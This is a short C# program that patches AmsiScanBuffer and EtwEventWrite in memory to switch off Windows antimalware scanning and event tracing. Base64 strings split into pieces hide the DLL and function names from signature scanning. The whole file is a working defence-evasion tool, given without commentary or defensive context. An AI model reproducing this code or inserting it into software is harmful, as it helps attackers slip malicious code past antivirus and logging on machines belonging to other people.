using System;
using System.Runtime.InteropServices;
using System.Text;

public class ByPause
{

    public static int Main(String[] args)
    {
        Execute();
        Console.WriteLine("Compeleted all Bypausing");
        return 0;
    }
    public static void Execute()
    {
        uint oldProtect;

        var lib = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS" + "5kbGw=")));
        IntPtr asb = GetProcAddress(lib, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5" + "CdWZmZXI=")));
        var patch = GetFirstPause;

        _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);

        Marshal.Copy(patch, 0, asb, patch.Length);

        _ = VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);

        lib = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGwu" + "ZGxs")));
        asb = GetProcAddress(lib, Encoding.UTF8.GetString(Convert.FromBase64String("RXR3RXZlb" + "nRXcml0ZQ==")));
        patch = GetSecondPause;

        _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect);

        Marshal.Copy(patch, 0, asb, patch.Length);

        _ = VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
    }

    static byte[] GetFirstPause
    {
        get
        {
            if (Is64Bit)
            {
                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }

            return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        }
    }

    static byte[] GetSecondPause
    {
        get
        {
            if (Is64Bit)
            {
                return new byte[] { 0xC3, 0x00 };
            }

            return new byte[] { 0xC2, 0x14, 0x00 };
        }
    }


    static bool Is64Bit
    {
        get
        {
            return IntPtr.Size == 8;
        }
    }

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(
        string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
}